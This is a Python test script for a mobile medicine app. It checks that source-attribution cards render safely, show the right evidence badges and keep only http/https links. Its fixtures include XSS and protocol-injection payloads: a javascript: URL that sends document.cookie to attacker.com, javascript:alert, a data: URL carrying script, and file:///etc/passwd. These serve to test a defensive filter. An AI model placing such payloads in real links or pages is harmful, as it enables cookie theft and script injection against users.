#!/usr/bin/env python3
"""
scripts/test_batch_d_ui_sources.py
Batch D4: Mobile-Client Source Attribution Tests

Verifies:
1. URL safety and protocol validation (only https:// and http:// allowed; javascript:, file:, data: rejected).
2. Absent sources & null retrieval handling (zero UI clutter / graceful null render).
3. Authoritative vs Provisional vs Unverified classification badge labeling.
4. Correct extraction and display of legal basis, schedule category, and drug interaction findings.
5. Resilience against malformed or partial retrieval payloads without crashing.
"""

import sys
import re

def is_valid_http_url(url: str | None) -> bool:
    if not url:
        return False
    trimmed = url.strip().lower()
    return trimmed.startswith("https://") or trimmed.startswith("http://")

def simulate_source_card_behavior(retrieval: dict | None) -> dict:
    """Simulates the state and rendering logic of SourceAttributionCard."""
    if not retrieval:
        return {"rendered": False, "reason": "null_or_empty_retrieval"}

    matches = retrieval.get("medicine_matches") or []
    interactions = retrieval.get("interaction_findings") or []
    warnings = retrieval.get("warnings") or []
    limitations = retrieval.get("limitations") or []
    sources = retrieval.get("sources") or []

    has_content = any([matches, interactions, warnings, limitations, sources])
    if not has_content:
        return {"rendered": False, "reason": "empty_content"}

    has_auth = any(m.get("status_verification") == "verified_authoritative" for m in matches)
    has_provisional = any(m.get("status_verification") == "provisional_evidence" for m in matches)
    has_unverified = any(m.get("status_verification") == "unverified" for m in matches)

    badge_label = "Clinical Evidence & Sources"
    if has_auth:
        badge_label = "Authoritative Evidence Verified"
    elif has_provisional:
        badge_label = "Provisional Regulatory Evidence"
    elif has_unverified:
        badge_label = "Unverified Indian Rx Status"

    safe_links = []
    for m in matches:
        u = m.get("source_url")
        if is_valid_http_url(u):
            safe_links.append(u)
    for s in sources:
        u = s.get("url")
        if is_valid_http_url(u):
            safe_links.append(u)

    return {
        "rendered": True,
        "badge_label": badge_label,
        "matches_count": len(matches),
        "interactions_count": len(interactions),
        "safe_links_count": len(safe_links),
        "safe_links": safe_links,
        "warnings_count": len(warnings),
    }

def run_tests():
    print("=" * 70)
    print("BATCH D4: SOURCE ATTRIBUTION & URL SAFETY TESTS")
    print("=" * 70)

    results = []

    # Test 1: URL Safety Validation
    print("\n[TEST 1] Safe vs Malicious / Invalid URL Filtering")
    test_urls = [
        ("https://cdsco.gov.in/records/123", True),
        ("http://ipc.gov.in/formulary", True),
        ("javascript:alert(document.cookie)", False),
        ("file:///etc/passwd", False),
        ("data:text/html,<script>alert(1)</script>", False),
        ("ftp://insecure-host.org/download", False),
        ("", False),
        (None, False),
    ]
    url_tests_passed = True
    for u, expected in test_urls:
        actual = is_valid_http_url(u)
        if actual != expected:
            url_tests_passed = False
            print(f"  FAIL: URL '{u}' expected {expected}, got {actual}")
    results.append(("URL Scheme & Protocol Sanitization", url_tests_passed, "Malicious schemes rejected, HTTPS/HTTP accepted"))
    print(f"  Result: {'PASS' if url_tests_passed else 'FAIL'}")

    # Test 2: Absent / Null Retrieval Handling
    print("\n[TEST 2] Absent / Null Retrieval Handling (Zero UI Clutter)")
    null_card = simulate_source_card_behavior(None)
    empty_card = simulate_source_card_behavior({})
    absent_pass = (not null_card["rendered"]) and (not empty_card["rendered"])
    results.append(("Absent Sources Graceful Fallback", absent_pass, "Returns null; does not clutter UI"))
    print(f"  Result: {'PASS' if absent_pass else 'FAIL'}")

    # Test 3: Authoritative Verification Badge
    print("\n[TEST 3] Authoritative Verification Badge (CDSCO Schedule K)")
    auth_payload = {
        "medicine_matches": [{
            "name": "Paracetamol 500mg",
            "generic_name": "Paracetamol",
            "prescription_status": "OTC",
            "schedule_category": "Schedule K",
            "status_verification": "verified_authoritative",
            "legal_basis": "Drugs and Cosmetics Rules 1945, Schedule K Item 23",
            "source_organization": "CDSCO",
            "source_url": "https://cdsco.gov.in/",
        }],
        "sources": [{"title": "CDSCO Schedule K Gazette", "url": "https://cdsco.gov.in/"}],
    }
    auth_card = simulate_source_card_behavior(auth_payload)
    auth_pass = auth_card["rendered"] and auth_card["badge_label"] == "Authoritative Evidence Verified" and auth_card["safe_links_count"] == 2
    results.append(("Authoritative Evidence Badge", auth_pass, f"Badge: '{auth_card.get('badge_label')}'"))
    print(f"  Result: {'PASS' if auth_pass else 'FAIL'}")

    # Test 4: Provisional Evidence Badge
    print("\n[TEST 4] Provisional Evidence Badge (Draft Schedule K)")
    provisional_payload = {
        "medicine_matches": [{
            "name": "Clotrimazole 1% Cream",
            "generic_name": "Clotrimazole",
            "prescription_status": "OTC",
            "schedule_category": "Schedule K",
            "status_verification": "provisional_evidence",
            "legal_basis": "CDSCO Draft Notification G.S.R. 393(E)",
            "source_url": "https://cdsco.gov.in/drafts",
        }]
    }
    prov_card = simulate_source_card_behavior(provisional_payload)
    prov_pass = prov_card["rendered"] and prov_card["badge_label"] == "Provisional Regulatory Evidence"
    results.append(("Provisional Evidence Badge", prov_pass, f"Badge: '{prov_card.get('badge_label')}'"))
    print(f"  Result: {'PASS' if prov_pass else 'FAIL'}")

    # Test 5: Unverified Indian Prescription Status
    print("\n[TEST 5] Unverified Status Distinction")
    unverified_payload = {
        "medicine_matches": [{
            "name": "Melatonin 3mg",
            "generic_name": "Melatonin",
            "prescription_status": "unverified",
            "schedule_category": "unverified",
            "status_verification": "unverified",
        }]
    }
    unv_card = simulate_source_card_behavior(unverified_payload)
    unv_pass = unv_card["rendered"] and unv_card["badge_label"] == "Unverified Indian Rx Status"
    results.append(("Unverified Status Distinction", unv_pass, f"Badge: '{unv_card.get('badge_label')}'"))
    print(f"  Result: {'PASS' if unv_pass else 'FAIL'}")

    # Test 6: Malformed / Injection Links Sanitization
    print("\n[TEST 6] Malformed / Injected URL Defense in Payload")
    malicious_payload = {
        "medicine_matches": [{
            "name": "Aspirin",
            "source_url": "javascript:fetch('https://attacker.com/leak?cookie=' + document.cookie)",
            "status_verification": "verified_authoritative",
        }],
        "sources": [
            {"title": "Compromised Source", "url": "data:text/html,<script>alert(1)</script>"},
            {"title": "Valid Source", "url": "https://ipc.gov.in/"},
        ]
    }
    mal_card = simulate_source_card_behavior(malicious_payload)
    mal_pass = mal_card["safe_links_count"] == 1 and mal_card["safe_links"] == ["https://ipc.gov.in/"]
    results.append(("Payload XSS / Protocol Injection Defense", mal_pass, "Dangerous URLs filtered out from link buttons"))
    print(f"  Result: {'PASS' if mal_pass else 'FAIL'}")

    print("\n" + "=" * 70)
    print("BATCH D4 SUMMARY RESULTS:")
    print("=" * 70)
    all_passed = True
    for name, passed, detail in results:
        status_str = "PASS" if passed else "FAIL"
        if not passed:
            all_passed = False
        print(f"[{status_str}] {name:40} | {detail}")
    print("=" * 70)

    if all_passed:
        print("ALL D4 SOURCE ATTRIBUTION & SECURITY TESTS PASSED (6 / 6)")
        return 0
    else:
        print("SOME D4 TESTS FAILED!")
        return 1

if __name__ == "__main__":
    sys.exit(run_tests())
